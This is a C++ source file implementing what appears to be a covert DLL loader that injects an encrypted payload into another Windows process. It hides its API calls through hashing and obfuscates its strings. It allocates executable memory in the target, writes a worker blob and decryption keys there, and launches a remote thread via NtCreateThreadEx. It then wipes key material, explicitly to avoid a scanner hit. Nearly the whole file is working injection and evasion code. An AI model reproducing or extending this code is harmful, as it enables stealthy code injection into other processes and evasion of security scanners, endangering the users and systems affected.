#include "payload_worker.h"
#include "stub_worker.h"
#include "dynapi.h"
#include "obfstr.h"

#include <Windows.h>
#include <cstdint>
#include <cstring>

namespace payload_worker {

// ---- Local kernel32 / ntdll / bcrypt API pointers ----
using fn_VirtualAllocEx     = LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
using fn_VirtualFreeEx      = BOOL  (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD);
using fn_WriteProcessMemory = BOOL  (WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
using fn_ReadProcessMemory  = BOOL  (WINAPI*)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
using fn_WaitForSingleObject= DWORD (WINAPI*)(HANDLE, DWORD);
using fn_CloseHandle        = BOOL  (WINAPI*)(HANDLE);
using fn_GetExitCodeThread  = BOOL  (WINAPI*)(HANDLE, LPDWORD);
using fn_FindResourceW      = HRSRC (WINAPI*)(HMODULE, LPCWSTR, LPCWSTR);
using fn_LoadResource       = HGLOBAL(WINAPI*)(HMODULE, HRSRC);
using fn_LockResource       = LPVOID(WINAPI*)(HGLOBAL);
using fn_SizeofResource     = DWORD (WINAPI*)(HMODULE, HRSRC);
using fn_GetModuleHandleW   = HMODULE(WINAPI*)(LPCWSTR);
using fn_NtCreateThreadEx   = LONG  (NTAPI*) (PHANDLE, ACCESS_MASK, LPVOID,
                                              HANDLE, LPTHREAD_START_ROUTINE,
                                              LPVOID, ULONG, SIZE_T, SIZE_T,
                                              SIZE_T, LPVOID);

struct resolved {
    // kernel32 (for the loader side):
    fn_VirtualAllocEx      vaex;
    fn_VirtualFreeEx       vfex;
    fn_WriteProcessMemory  wpm;
    fn_ReadProcessMemory   rpm;
    fn_WaitForSingleObject wait;
    fn_CloseHandle         close;
    fn_GetExitCodeThread   gxt;
    fn_FindResourceW       find_res;
    fn_LoadResource        load_res;
    fn_LockResource        lock_res;
    fn_SizeofResource      size_res;
    fn_GetModuleHandleW    get_module_w;
    // ntdll:
    fn_NtCreateThreadEx    ncte;
    // Pointers the worker consumes directly (same addresses in target
    // under same-boot ASLR). Everything the loader resolves here is
    // handed to the worker through sb_worker_args.
    void*                  p_load_library_a;
    void*                  p_get_proc_address;
    void*                  p_virtual_alloc;
    void*                  p_virtual_free;
    void*                  p_virtual_protect;
    void*                  p_flush_icache;
    void*                  p_get_current_proc;
    void*                  p_get_system_time;
    void*                  p_open_alg;
    void*                  p_set_prop;
    void*                  p_gen_sym_key;
    void*                  p_decrypt;
    void*                  p_destroy_key;
    void*                  p_close_alg;
    void*                  p_create_hash;
    void*                  p_hash_data;
    void*                  p_finish_hash;
    void*                  p_destroy_hash;
};

static bool resolve_all(resolved& r) {
    auto k32   = dynapi::get_module(dynapi::modules::KERNEL32);
    auto ntdll = dynapi::get_module(dynapi::modules::NTDLL);
    if (!k32 || !ntdll) return false;

    // Loader-side k32 helpers (used only here).
    r.vaex         = reinterpret_cast<fn_VirtualAllocEx>     (dynapi::resolve(k32, API_HASH("VirtualAllocEx")));
    r.vfex         = reinterpret_cast<fn_VirtualFreeEx>      (dynapi::resolve(k32, API_HASH("VirtualFreeEx")));
    r.wpm          = reinterpret_cast<fn_WriteProcessMemory> (dynapi::resolve(k32, API_HASH("WriteProcessMemory")));
    r.rpm          = reinterpret_cast<fn_ReadProcessMemory>  (dynapi::resolve(k32, API_HASH("ReadProcessMemory")));
    r.wait         = reinterpret_cast<fn_WaitForSingleObject>(dynapi::resolve(k32, API_HASH("WaitForSingleObject")));
    r.close        = reinterpret_cast<fn_CloseHandle>        (dynapi::resolve(k32, API_HASH("CloseHandle")));
    r.gxt          = reinterpret_cast<fn_GetExitCodeThread>  (dynapi::resolve(k32, API_HASH("GetExitCodeThread")));
    r.find_res     = reinterpret_cast<fn_FindResourceW>      (dynapi::resolve(k32, API_HASH("FindResourceW")));
    r.load_res     = reinterpret_cast<fn_LoadResource>       (dynapi::resolve(k32, API_HASH("LoadResource")));
    r.lock_res     = reinterpret_cast<fn_LockResource>       (dynapi::resolve(k32, API_HASH("LockResource")));
    r.size_res     = reinterpret_cast<fn_SizeofResource>     (dynapi::resolve(k32, API_HASH("SizeofResource")));
    r.get_module_w = reinterpret_cast<fn_GetModuleHandleW>   (dynapi::resolve(k32, API_HASH("GetModuleHandleW")));
    r.ncte         = reinterpret_cast<fn_NtCreateThreadEx>   (dynapi::resolve(ntdll, API_HASH("NtCreateThreadEx")));

    // Pointers forwarded to the worker.
    r.p_load_library_a   = dynapi::resolve(k32, API_HASH("LoadLibraryA"));
    r.p_get_proc_address = dynapi::resolve(k32, API_HASH("GetProcAddress"));
    r.p_virtual_alloc    = dynapi::resolve(k32, API_HASH("VirtualAlloc"));
    r.p_virtual_free     = dynapi::resolve(k32, API_HASH("VirtualFree"));
    r.p_virtual_protect  = dynapi::resolve(k32, API_HASH("VirtualProtect"));
    r.p_flush_icache     = dynapi::resolve(k32, API_HASH("FlushInstructionCache"));
    r.p_get_current_proc = dynapi::resolve(k32, API_HASH("GetCurrentProcess"));
    r.p_get_system_time  = dynapi::resolve(k32, API_HASH("GetSystemTimeAsFileTime"));

    // bcrypt — load the module into THIS process so every BCrypt* address
    // we hand to the worker reflects the system-chosen base. The worker
    // forces the same DLL into the target (via LoadLibraryA at thread start)
    // and under same-boot ASLR the resulting base matches.
    auto bcrypt = dynapi::load_module(OBF("bcrypt.dll").c_str());
    if (!bcrypt) return false;
    r.p_open_alg      = dynapi::resolve(bcrypt, API_HASH("BCryptOpenAlgorithmProvider"));
    r.p_set_prop      = dynapi::resolve(bcrypt, API_HASH("BCryptSetProperty"));
    r.p_gen_sym_key   = dynapi::resolve(bcrypt, API_HASH("BCryptGenerateSymmetricKey"));
    r.p_decrypt       = dynapi::resolve(bcrypt, API_HASH("BCryptDecrypt"));
    r.p_destroy_key   = dynapi::resolve(bcrypt, API_HASH("BCryptDestroyKey"));
    r.p_close_alg     = dynapi::resolve(bcrypt, API_HASH("BCryptCloseAlgorithmProvider"));
    r.p_create_hash   = dynapi::resolve(bcrypt, API_HASH("BCryptCreateHash"));
    r.p_hash_data     = dynapi::resolve(bcrypt, API_HASH("BCryptHashData"));
    r.p_finish_hash   = dynapi::resolve(bcrypt, API_HASH("BCryptFinishHash"));
    r.p_destroy_hash  = dynapi::resolve(bcrypt, API_HASH("BCryptDestroyHash"));

    return r.vaex && r.vfex && r.wpm && r.rpm && r.wait && r.close
        && r.gxt && r.find_res && r.load_res && r.lock_res && r.size_res
        && r.get_module_w && r.ncte
        && r.p_load_library_a && r.p_get_proc_address && r.p_virtual_alloc
        && r.p_virtual_free && r.p_virtual_protect && r.p_flush_icache
        && r.p_get_current_proc && r.p_get_system_time
        && r.p_open_alg && r.p_set_prop && r.p_gen_sym_key && r.p_decrypt
        && r.p_destroy_key && r.p_close_alg
        && r.p_create_hash && r.p_hash_data && r.p_finish_hash && r.p_destroy_hash;
}

// hex (64 chars lowercase/uppercase) -> 32 bytes. Returns false on
// any non-hex char.
static bool hex_to_bytes_32(const char* hex, uint8_t out[32]) {
    for (int i = 0; i < 32; ++i) {
        int hi = -1, lo = -1;
        char ch = hex[i * 2];
        char cl = hex[i * 2 + 1];
        if (ch >= '0' && ch <= '9') hi = ch - '0';
        else if (ch >= 'a' && ch <= 'f') hi = 10 + (ch - 'a');
        else if (ch >= 'A' && ch <= 'F') hi = 10 + (ch - 'A');
        if (cl >= '0' && cl <= '9') lo = cl - '0';
        else if (cl >= 'a' && cl <= 'f') lo = 10 + (cl - 'a');
        else if (cl >= 'A' && cl <= 'F') lo = 10 + (cl - 'A');
        if (hi < 0 || lo < 0) return false;
        out[i] = static_cast<uint8_t>((hi << 4) | lo);
    }
    return true;
}

// Expand OBF narrow -> fixed-size wide buffer (null-terminated).
template<size_t N>
static void narrow_to_wide(const char* src, uint16_t (&dst)[N]) {
    for (size_t i = 0; i < N; ++i) dst[i] = 0;
    for (size_t i = 0; i < N - 1 && src[i]; ++i)
        dst[i] = static_cast<uint16_t>(static_cast<unsigned char>(src[i]));
}

static void copy_cstr(char* dst, size_t cap, const char* src) {
    for (size_t i = 0; i < cap; ++i) dst[i] = 0;
    for (size_t i = 0; i < cap - 1 && src[i]; ++i) dst[i] = src[i];
}

outcome schedule(void*          hProc,
                 const uint8_t* ciphertext, uint32_t ct_len,
                 const uint8_t  iv[12],
                 const uint8_t  tag[16],
                 const uint8_t  k_payload_aes[32],
                 const uint8_t  k_watermark[32],
                 const char*    local_hwid,
                 const uint8_t  license_hash[32],
                 uint32_t       timeout_ms)
{
    outcome o{result::ok, 0u, 0u};

    if (!hProc || !ciphertext || ct_len == 0 || !iv || !tag ||
        !k_payload_aes || !k_watermark || !local_hwid || !license_hash)
    {
        o.res = result::write_failed;
        return o;
    }

    resolved r{};
    if (!resolve_all(r)) { o.res = result::resolve_failed; return o; }

    // --- Locate worker blob in the loader image ------------------
    HMODULE self = r.get_module_w(nullptr);
    HRSRC   hres = r.find_res(self, MAKEINTRESOURCEW(SB_RESOURCE_WORKER_BLOB),
                              MAKEINTRESOURCEW(10) /* RT_RCDATA */);
    if (!hres) { o.res = result::resource_missing; return o; }
    HGLOBAL hg = r.load_res(self, hres);
    if (!hg)   { o.res = result::resource_missing; return o; }
    void*   blob_ptr  = r.lock_res(hg);
    DWORD   blob_size = r.size_res(self, hres);
    if (!blob_ptr || blob_size == 0) { o.res = result::resource_missing; return o; }

    // --- Allocate in target --------------------------------------
    uint8_t* ct_remote     = static_cast<uint8_t*>(
        r.vaex(hProc, nullptr, ct_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    uint8_t* pt_remote     = static_cast<uint8_t*>(
        r.vaex(hProc, nullptr, ct_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    uint8_t* blob_remote   = static_cast<uint8_t*>(
        r.vaex(hProc, nullptr, blob_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    uint8_t* args_remote   = static_cast<uint8_t*>(
        r.vaex(hProc, nullptr, sizeof(sb_worker_args),
               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    auto free_all = [&]() {
        if (ct_remote)   r.vfex(hProc, ct_remote,   0, MEM_RELEASE);
        if (pt_remote)   r.vfex(hProc, pt_remote,   0, MEM_RELEASE);
        if (blob_remote) r.vfex(hProc, blob_remote, 0, MEM_RELEASE);
        if (args_remote) r.vfex(hProc, args_remote, 0, MEM_RELEASE);
    };

    if (!ct_remote || !pt_remote || !blob_remote || !args_remote) {
        free_all(); o.res = result::oom; return o;
    }

    // --- Write ciphertext + blob into target ---------------------
    SIZE_T written = 0;
    if (!r.wpm(hProc, ct_remote, ciphertext, ct_len, &written) || written != ct_len) {
        free_all(); o.res = result::write_failed; return o;
    }
    if (!r.wpm(hProc, blob_remote, blob_ptr, blob_size, &written) || written != blob_size) {
        free_all(); o.res = result::write_failed; return o;
    }

    // --- Build args locally --------------------------------------
    sb_worker_args a{};

    a.p_load_library_a   = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_load_library_a));
    a.p_get_proc_address = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_get_proc_address));
    a.p_open_alg         = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_open_alg));
    a.p_set_prop         = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_set_prop));
    a.p_gen_sym_key      = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_gen_sym_key));
    a.p_decrypt          = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_decrypt));
    a.p_destroy_key      = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_destroy_key));
    a.p_close_alg        = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_close_alg));
    a.p_create_hash      = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_create_hash));
    a.p_hash_data        = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_hash_data));
    a.p_finish_hash      = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_finish_hash));
    a.p_destroy_hash     = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_destroy_hash));
    a.p_virtual_alloc    = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_virtual_alloc));
    a.p_virtual_free     = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_virtual_free));
    a.p_virtual_protect  = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_virtual_protect));
    a.p_flush_icache     = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_flush_icache));
    a.p_get_current_proc = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_get_current_proc));
    a.p_get_system_time  = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(r.p_get_system_time));

    a.ct_ptr = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(ct_remote));
    a.ct_len = ct_len;
    a.pt_ptr = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(pt_remote));
    a.pt_cap = ct_len;
    memcpy(a.iv,             iv,             12);
    memcpy(a.tag,            tag,            16);
    memcpy(a.k_payload_aes,  k_payload_aes,  32);
    memcpy(a.k_watermark,    k_watermark,    32);
    memcpy(a.license_hash,   license_hash,   32);
    if (!hex_to_bytes_32(local_hwid, a.hwid_bytes)) {
        free_all(); o.res = result::write_failed; return o;
    }

    {
        auto aes_n = OBF("AES");
        auto sha_n = OBF("SHA256");
        auto cm_n  = OBF("ChainingMode");
        auto gcm_n = OBF("ChainingModeGCM");
        auto bc_n  = OBF("bcrypt.dll");
        narrow_to_wide(aes_n.c_str(), a.s_aes);
        narrow_to_wide(sha_n.c_str(), a.s_sha256);
        narrow_to_wide(cm_n.c_str(),  a.s_chaining_mode);
        narrow_to_wide(gcm_n.c_str(), a.s_chaining_mode_gcm);
        copy_cstr(a.s_bcrypt_dll, sizeof(a.s_bcrypt_dll), bc_n.c_str());
    }

    a.result_code = 0;
    a.stop_flag   = 0;

    if (!r.wpm(hProc, args_remote, &a, sizeof(a), &written) || written != sizeof(a)) {
        free_all(); o.res = result::write_failed; return o;
    }

    // Scrub the local copy — key material lives only in the target now.
    volatile uint8_t* av = reinterpret_cast<uint8_t*>(&a);
    for (size_t i = 0; i < sizeof(a); ++i) av[i] = 0;

    // --- Schedule worker thread ----------------------------------
    HANDLE hThread = nullptr;
    LONG   st = r.ncte(&hThread,
        0x1FFFFF /* THREAD_ALL_ACCESS */, nullptr, hProc,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(blob_remote),
        args_remote,
        0, 0, 0, 0, nullptr);
    if (st < 0 || !hThread) {
        free_all(); o.res = result::thread_failed; return o;
    }

    DWORD wr = r.wait(hThread, timeout_ms);
    if (wr != WAIT_OBJECT_0) {
        r.close(hThread);
        // Leave allocations intact — the worker may still be executing;
        // tearing them down here would race.
        o.res = result::worker_timeout;
        return o;
    }

    // --- Read result_code + dll_main_rc back ---------------------
    uint32_t fields[2] = {0, 0};
    SIZE_T   bytes_read = 0;
    const uint8_t* rc_src  =
        args_remote + offsetof(sb_worker_args, result_code);
    const uint8_t* dlm_src =
        args_remote + offsetof(sb_worker_args, dll_main_rc);
    if (!r.rpm(hProc, rc_src,  &fields[0], 4, &bytes_read) || bytes_read != 4) {
        r.close(hThread); o.res = result::write_failed; return o;
    }
    if (!r.rpm(hProc, dlm_src, &fields[1], 4, &bytes_read) || bytes_read != 4) {
        r.close(hThread); o.res = result::write_failed; return o;
    }
    r.close(hThread);

    o.worker_rc   = fields[0];
    o.dll_main_rc = fields[1];
    if (o.worker_rc != 0) { o.res = result::worker_failed; return o; }

    // Zero the args / ciphertext regions in-target: the worker is done
    // with them and keeping key material around invites a scanner hit.
    {
        uint8_t zero[256] = {0};
        SIZE_T  wz = 0;
        for (SIZE_T off = 0; off < ct_len; off += sizeof(zero)) {
            SIZE_T chunk = (ct_len - off < sizeof(zero)) ? (ct_len - off) : sizeof(zero);
            r.wpm(hProc, ct_remote + off, zero, chunk, &wz);
        }
        for (SIZE_T off = 0; off < sizeof(sb_worker_args); off += sizeof(zero)) {
            SIZE_T chunk =
                (sizeof(sb_worker_args) - off < sizeof(zero))
                    ? (sizeof(sb_worker_args) - off) : sizeof(zero);
            r.wpm(hProc, args_remote + off, zero, chunk, &wz);
        }
    }
    r.vfex(hProc, ct_remote,   0, MEM_RELEASE);
    r.vfex(hProc, args_remote, 0, MEM_RELEASE);
    // pt_remote and blob_remote stay: the mapped DLL (and any lingering
    // worker code) references them until the host process exits.
    (void)pt_remote;
    (void)blob_remote;

    o.res = result::ok;
    return o;
}

} // namespace payload_worker
